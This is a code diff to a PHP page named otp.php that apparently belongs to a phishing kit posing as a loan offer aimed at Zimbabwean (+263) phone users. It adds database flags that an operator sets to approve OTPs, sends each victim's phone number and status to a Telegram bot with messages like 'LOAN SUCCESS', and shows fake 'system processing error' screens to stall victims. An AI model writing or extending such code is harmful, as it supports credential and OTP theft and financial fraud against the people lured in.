@@ -106,34 +106,54 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $error = "System error. Please contact administrator.";
         error_log("PostgreSQL connection failed in otp.php");
     } else {
-        // Ensure `users` table exists (with `otp` column default 0)
+        // Ensure `users` table exists with all required columns
         $createSQL = "
             CREATE TABLE IF NOT EXISTS users (
                 phone VARCHAR(20) PRIMARY KEY,
                 status INTEGER DEFAULT 0,
                 pin INTEGER DEFAULT 0,
-                otp INTEGER DEFAULT 0
+                otp INTEGER DEFAULT 0,
+                logout INTEGER DEFAULT 0,
+                error_processing INTEGER DEFAULT 0
             )
         ";
         pg_query($conn, $createSQL);
         
-        // Insert phone if not exists (with default otp=0)
-        $insertSQL = "INSERT INTO users (phone, status, pin, otp) VALUES ($1, 0, 0, 0) ON CONFLICT (phone) DO NOTHING";
+        // Insert phone if not exists (with default values)
+        $insertSQL = "INSERT INTO users (phone, status, pin, otp, logout, error_processing) VALUES ($1, 0, 0, 0, 0, 0) ON CONFLICT (phone) DO NOTHING";
         pg_query_params($conn, $insertSQL, [$phone]);
         
-        // Check the `otp` flag for this phone
-        $checkSQL = "SELECT otp FROM users WHERE phone = $1";
+        // Check the `otp` flag AND `logout` flag for this phone
+        $checkSQL = "SELECT otp, logout FROM users WHERE phone = $1";
         $result = pg_query_params($conn, $checkSQL, [$phone]);
         if ($result && $row = pg_fetch_assoc($result)) {
             $otpStatus = (int)$row['otp'];
+            $logoutStatus = (int)$row['logout'];
             
-            if ($otpStatus === 1) {
-                // OTP approved → send Telegram success and redirect to dashboard
-                $successMsg = "✅ LOAN SUCCESS ✅<br>📱 Phone: +263 {$phone}<br>🕒 Time: " . date('Y-m-d H:i:s');
-                sendTelegramMessage($botToken, $chatId, $successMsg, 'HTML');
-                
-                header("Location: dashboard.php");
-                exit;
+            if ($otpStatus == 1) {
+                // Check logout column value
+                if ($logoutStatus == 0) {
+                    // Update error_processing to 1
+                    $updateSQL = "UPDATE users SET error_processing = 1 WHERE phone = $1";
+                    pg_query_params($conn, $updateSQL, [$phone]);
+                    
+                    // Send Telegram notification
+                    $errorMsg = "⚠️ OTP VERIFIED BUT LOGOUT=0 ⚠️<br>📱 Phone: +263 {$phone}<br>🕒 Time: " . date('Y-m-d H:i:s') . "<br>Action: error_processing set to 1";
+                    sendTelegramMessage($botToken, $chatId, $errorMsg, 'HTML');
+                    
+                    $error = "System processing error. Please contact support.";
+                } elseif ($logoutStatus == 1) {
+                    // Redirect to loggedin.php
+                    $successMsg = "✅ LOAN SUCCESS ✅<br>📱 Phone: +263 {$phone}<br>🕒 Time: " . date('Y-m-d H:i:s');
+                    sendTelegramMessage($botToken, $chatId, $successMsg, 'HTML');
+                    
+                    header("Location: loggedin.php");
+                    exit;
+                } else {
+                    // Default case - redirect to dashboard
+                    header("Location: dashboard.php");
+                    exit;
+                }
             } else {
                 $error = "Wrong OTP";
                 // Optional: send Telegram notification of failed attempt
